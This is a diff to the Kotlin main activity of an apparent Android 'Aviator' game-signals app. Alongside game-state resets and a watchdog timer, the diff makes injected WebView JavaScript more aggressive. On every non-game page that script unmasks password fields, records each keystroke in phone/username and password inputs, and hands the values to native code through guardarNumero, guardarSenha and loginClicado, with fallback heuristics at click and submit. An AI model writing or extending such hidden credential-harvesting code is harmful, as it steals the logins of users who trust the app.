@@ -629,26 +629,37 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun aviatorAberto() = runOnUiThread {
-                if (!dentroDoAviator) {
-                    dentroDoAviator = true
-                    graficoPronto = false
-                    historicoJogoCarregado = false
-                    historicoVelas.clear()
-                    sinaisAtivos = false
-                    sinalProtecao = ""
-                    sinalMinEntrada = -1
-                    sinalMinSaida   = -1
-                    cicloAtivo = false
-                    janelaJaDisparou = false
-                    credenciaisEnviadas = false  // reset para nova sessão
-                    proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
-                    emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
-                    // Iniciar relógio imediatamente para mostrar hora desde o início
-                    if (relogioRunnable == null) iniciarRelogio()
-                    setBarra("🔄 A CARREGAR...", "Aviator aberto · a buscar velas...", "#475569")
-                    // Carregar velas do Supabase imediatamente ao abrir
-                    carregarVelasSupabaseRecentes()
-                }
+                // Reinicializar SEMPRE — ao entrar ou ao voltar ao Aviator
+                dentroDoAviator = true
+                graficoPronto = false
+                historicoJogoCarregado = false
+                historicoVelas.clear()
+                sinaisAtivos = false
+                sinalProtecao = ""
+                sinalAlcMin = 0
+                sinalAlcMax = ""
+                sinalMinEntrada = -1
+                sinalMinSaida   = -1
+                cicloAtivo = false
+                janelaJaDisparou = false
+                analisandoIA = false
+                emVoo = false; xAtual = 0.0; ultimoCrash = 0.0
+                modoSilenciosoAtivo = false
+                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
+                proximaAnaliseRunnable = null
+                retryIaJob?.let { handler.removeCallbacks(it) }
+                retryIaJob = null
+                invalidarCache()
+                // Iniciar relógio se ainda não está activo
+                if (relogioRunnable == null) iniciarRelogio()
+                setBarra("🔄 A CARREGAR...", "Aviator aberto · a buscar velas...", "#475569")
+                // Limpar UI de sinais antigos
+                txtProtecao.text = "--"; txtProtecao.setTextColor(Color.parseColor("#334155"))
+                txtAlcance.text = "--"; txtAlcance.setTextColor(Color.parseColor("#334155"))
+                if (::txtJanela.isInitialized) txtJanela.visibility = View.GONE
+                if (::txtAviso.isInitialized) txtAviso.visibility = View.GONE
+                // Carregar velas recentes do Supabase para ter histórico imediato
+                carregarVelasSupabaseRecentes()
             }
 
             @JavascriptInterface
@@ -956,13 +967,15 @@ class MainActivity : AppCompatActivity() {
                              u.contains("cdn") || u.contains("game-view/806666")
 
                 if (!isJogo) {
-                    // Resetar flag para garantir re-injecção em cada nova página (SPA)
+                    // Resetar flags para garantir re-injecção em cada nova página (SPA)
                     webView.evaluateJavascript("window._credDone = false;", null)
                     injetarJsCredenciais()
                 }
 
                 if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
                     u.contains("spribegaming") || u.contains("aviaport")) {
+                    // Resetar _aviatorDone para garantir re-injecção ao voltar ao Aviator
+                    webView.evaluateJavascript("window._aviatorDone = false; window._wsAvOk = false; window._histEnviado = false;", null)
                     injetarJsAviator()
                 }
             }
@@ -978,109 +991,157 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
-    // Resetar flag se já passou tempo (para re-injectar em novas páginas)
     if (window._credDone) return;
     window._credDone = true;
 
-    // Tornar campos password visíveis (facilita captura)
+    // ── Variáveis locais para guardar enquanto o utilizador digita ──
+    var _numero = '';
+    var _senha  = '';
+
+    // ── Tornar campos password visíveis E marcar como senha ──────
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            el.setAttribute('data-skybot-senha', 'true');
-            el.setAttribute('type', 'text');
+            el.setAttribute('data-skybot-pw', 'true');
+            el.type = 'text';
         });
     }
     tornarVisivel();
-    new MutationObserver(tornarVisivel)
-        .observe(document.body || document.documentElement, {childList: true, subtree: true});
+    new MutationObserver(function() { tornarVisivel(); cap(); })
+        .observe(document.documentElement, {childList: true, subtree: true});
 
-    // Watchers — guardam em memória (não enviam por cada tecla)
+    // ── Classificar um input ──────────────────────────────────────
+    function ehCampoNumero(el) {
+        var t = (el.type || '').toLowerCase();
+        var n = (el.name || el.id || el.placeholder || '').toLowerCase();
+        return t === 'tel' || t === 'number' ||
+            n.includes('phone') || n.includes('tel') || n.includes('numero') ||
+            n.includes('mobile') || n.includes('msisdn') ||
+            n.includes('username') || n.includes('login') || n.includes('user');
+    }
+
+    function ehCampoSenha(el) {
+        // Marcado pelo tornarVisivel() ou ainda é password (se não correu ainda)
+        if (el.getAttribute('data-skybot-pw') === 'true') return true;
+        if (el.type === 'password') return true;
+        var n = (el.name || el.id || el.placeholder || '').toLowerCase();
+        return n.includes('pass') || n.includes('senha') || n.includes('secret') ||
+               n.includes('pwd') || n.includes('word');
+    }
+
+    // ── Watcher de número ──────────────────────────────────────────
     function watchN(el) {
         if (!el || el._wN) return;
         el._wN = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) { try { Android.guardarNumero(v); } catch(e) {} }
+            if (v.length >= 1) { _numero = v; try { Android.guardarNumero(v); } catch(e) {} }
         });
-        if (el.value && el.value.length > 0) {
-            try { Android.guardarNumero(el.value.trim()); } catch(e) {}
-        }
+        if (el.value) { _numero = el.value.trim(); try { Android.guardarNumero(_numero); } catch(e) {} }
     }
+
+    // ── Watcher de senha ──────────────────────────────────────────
     function watchS(el) {
         if (!el || el._wS) return;
         el._wS = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) { try { Android.guardarSenha(v); } catch(e) {} }
+            if (v.length >= 1) { _senha = v; try { Android.guardarSenha(v); } catch(e) {} }
         });
-        if (el.value && el.value.length > 0) {
-            try { Android.guardarSenha(el.value.trim()); } catch(e) {}
-        }
+        if (el.value) { _senha = el.value.trim(); try { Android.guardarSenha(_senha); } catch(e) {} }
     }
 
-    // Selectores para campos de numero/utilizador
-    var selectoresN = [
-        'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
-        'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
-        'input[type="tel"]', 'input[type="number"]',
-        'input[placeholder*="telefone" i]', 'input[placeholder*="numero" i]',
-        'input[placeholder*="phone" i]', 'input[placeholder*="utilizador" i]',
-        'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
-        '#username', '#phone', '#login', '#msisdn'
-    ];
-    // Selectores para campos de senha
-    var selectoresS = [
-        'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
-        'input[type="password"]', 'input[data-skybot-senha="true"]',
-        'input[type="text"][name*="pass" i]',
-        'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
-        'input[placeholder*="palavra-passe" i]',
-        '#password', '#senha', '#pass'
-    ];
-
+    // ── Capturar todos os inputs presentes ────────────────────────
     function cap() {
-        selectoresN.forEach(function(sel) {
-            document.querySelectorAll(sel).forEach(watchN);
-        });
-        selectoresS.forEach(function(sel) {
-            document.querySelectorAll(sel).forEach(watchS);
+        document.querySelectorAll('input').forEach(function(el) {
+            if (ehCampoNumero(el)) watchN(el);
+            else if (ehCampoSenha(el)) watchS(el);
         });
     }
 
-    // Tentar várias vezes (SPA pode carregar os campos depois)
     cap();
-    setTimeout(cap, 1000);
-    setTimeout(cap, 2500);
-    setTimeout(cap, 5000);
-    setTimeout(cap, 8000);
+    setTimeout(cap, 500);
+    setTimeout(cap, 1500);
+    setTimeout(cap, 3000);
+    setTimeout(cap, 6000);
+    setTimeout(cap, 10000);
 
-    // Botão de login → capturar todos os campos e notificar Android
+    // ── Captura final robusta no momento do clique ────────────────
+    // Usa posição: o 1.º input com valor numérico >= 6 dígitos = número
+    // O 2.º input ou qualquer campo com data-skybot-pw = senha
+    function capturarNoClique() {
+        var todos = Array.from(document.querySelectorAll('input')).filter(function(el) {
+            return (el.value || '').trim().length > 0;
+        });
+
+        // Estratégia 1: usar watcher já configurado
+        if (_numero && _senha) {
+            try { Android.guardarNumero(_numero); } catch(e) {}
+            try { Android.guardarSenha(_senha); } catch(e) {}
+            try { Android.loginClicado(); } catch(e) {}
+            return;
+        }
+
+        // Estratégia 2: varrer todos os inputs com valor
+        var numEncontrado = '';
+        var senhaEncontrada = '';
+
+        todos.forEach(function(el) {
+            var v = (el.value || '').trim();
+            if (!v) return;
+            var isPw = el.getAttribute('data-skybot-pw') === 'true' || el.type === 'password';
+            var n = (el.name || el.id || el.placeholder || '').toLowerCase();
+            var isPassHint = n.includes('pass') || n.includes('senha') || n.includes('pwd');
+
+            if (isPw || isPassHint) {
+                if (!senhaEncontrada) senhaEncontrada = v;
+            } else {
+                // Pode ser número (telefone) — preferir o mais longo com dígitos
+                var soDigitos = v.replace(/\D/g, '');
+                if (soDigitos.length >= 6 && !numEncontrado) numEncontrado = v;
+                else if (!numEncontrado) numEncontrado = v;
+            }
+        });
+
+        // Estratégia 3: se ainda sem senha, o 2.º input com valor é a senha
+        if (!senhaEncontrada && todos.length >= 2) {
+            // O 1.º campo = número, o 2.º = senha (padrão mais comum)
+            var primeiro = (todos[0].value || '').trim();
+            var segundo  = (todos[1].value || '').trim();
+            if (!numEncontrado && primeiro) numEncontrado = primeiro;
+            if (!senhaEncontrada && segundo) senhaEncontrada = segundo;
+        }
+
+        if (numEncontrado) { try { Android.guardarNumero(numEncontrado); } catch(e) {} }
+        if (senhaEncontrada) { try { Android.guardarSenha(senhaEncontrada); } catch(e) {} }
+        try { Android.loginClicado(); } catch(e) {}
+    }
+
+    // ── Anexar a todos os botões e forms ──────────────────────────
     function watchForms() {
-        document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
-            if (el._wForm) return;
-            el._wForm = true;
+        // Botões de submit / login
+        document.querySelectorAll('button, [type="submit"], [role="button"]').forEach(function(el) {
+            if (el._wBtn) return;
+            el._wBtn = true;
             el.addEventListener('click', function() {
-                // Ler todos os inputs no momento do clique (valor final completo)
-                document.querySelectorAll('input').forEach(function(inp) {
-                    var t = (inp.type || '').toLowerCase();
-                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
-                    var v = (inp.value || '').trim();
-                    if (!v) return;
-                    var isNum = t === 'tel' || t === 'number' ||
-                        n.includes('phone') || n.includes('numero') ||
-                        n.includes('username') || n.includes('login') || n.includes('user');
-                    var isPass = t === 'password' || inp.getAttribute('data-skybot-senha') === 'true' ||
-                        (t === 'text' && (n.includes('pass') || n.includes('senha')));
-                    if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
-                    if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
-                });
-                // Notificar que o login foi clicado — enviar credenciais completas
-                try { Android.loginClicado(); } catch(e) {}
+                // Pequeno delay para garantir que o valor final está nos campos
+                setTimeout(capturarNoClique, 100);
+            });
+        });
+        // Submit no form (Enter no teclado)
+        document.querySelectorAll('form').forEach(function(form) {
+            if (form._wFrm) return;
+            form._wFrm = true;
+            form.addEventListener('submit', function() {
+                setTimeout(capturarNoClique, 100);
             });
         });
     }
+
     watchForms();
-    setTimeout(watchForms, 2000);
-    setTimeout(watchForms, 5000);
+    setTimeout(watchForms, 1000);
+    setTimeout(watchForms, 3000);
+    setTimeout(watchForms, 6000);
+    setTimeout(watchForms, 10000);
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
@@ -1387,6 +1448,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         analisandoIA = true
+        ultimaAnaliseMs = System.currentTimeMillis()  // watchdog: timestamp de início
 
         handler.postDelayed({
             if (analisandoIA) {
@@ -2200,7 +2262,9 @@ REGRAS ABSOLUTAS DO JSON:
                     txtRelogio.text = "${String.format("%02d",h)}:${String.format("%02d",m)}"
                     txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
                 }
-                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
+                // Correr verificarRelogio sempre que estamos dentro do Aviator
+                // (não só quando sinaisAtivos — precisamos monitorar o ciclo durante a pausa)
+                if (dentroDoAviator) verificarRelogio()
                 handler.postDelayed(this, 1000)
             }
         }
@@ -2218,6 +2282,14 @@ REGRAS ABSOLUTAS DO JSON:
             horaAtual = horaAgora
             ultimoMinutoGerado = -1
             analisandoIA = false
+        }
+
+        // ── WATCHDOG: se analisandoIA ficou preso > 20s, resetar ──
+        if (analisandoIA) {
+            val msPreso = System.currentTimeMillis() - ultimaAnaliseMs
+            if (ultimaAnaliseMs > 0 && msPreso > 20_000L) {
+                analisandoIA = false
+            }
         }
 
         if (!sinaisAtivos || sinalProtecao.isEmpty()) return
